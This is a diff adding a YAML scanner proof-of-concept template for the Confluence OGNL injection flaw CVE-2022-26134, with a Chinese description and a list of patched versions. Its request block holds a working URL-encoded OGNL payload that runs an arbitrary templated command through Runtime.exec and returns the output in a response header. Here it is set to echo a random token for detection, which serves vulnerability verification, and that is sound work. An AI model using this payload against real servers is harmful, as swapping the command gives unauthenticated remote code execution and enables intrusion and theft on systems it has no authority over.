@@ -1,0 +1,40 @@
+id: poc-yaml-Confluence-ognl-rce
+info:
+  name: Confluence OGNL 注入漏洞(CVE-2022-26134)
+  author:
+  - zxcv
+  description: |-
+    Confluence OGNL 注入漏洞(CVE-2022-26134)
+    Confluence Server和Confluence Data Center上存在一个OGNL注入漏洞，允许经过身份验证或在某些情况下未授权的攻击者，在Confluence Server或Confluence Data Center实例上执行任意代码。
+  severity: critical
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+    ##### 升级至如下版本：
+    ```
+    Confluence Server 7.4.17
+    Confluence Server 7.13.7
+    Confluence Server 7.14.3
+    Confluence Server 7.15.2
+    Confluence Server 7.16.4
+    Confluence Server 7.17.4
+    Confluence Server 7.18.1
+    ```
+requests:
+- matchers:
+  - type: status
+    status:
+    - 302
+  - type: word
+    part: header
+    words:
+    - 'X-Cmd-Response: {{verify}}'
+  matchers-condition: and
+  raw:
+  - |
+    GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{{cmd}}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+variables:
+  cmd: echo%20{{verify}}
+  verify: '{{rand_text_alphanumeric(32,"")}}'
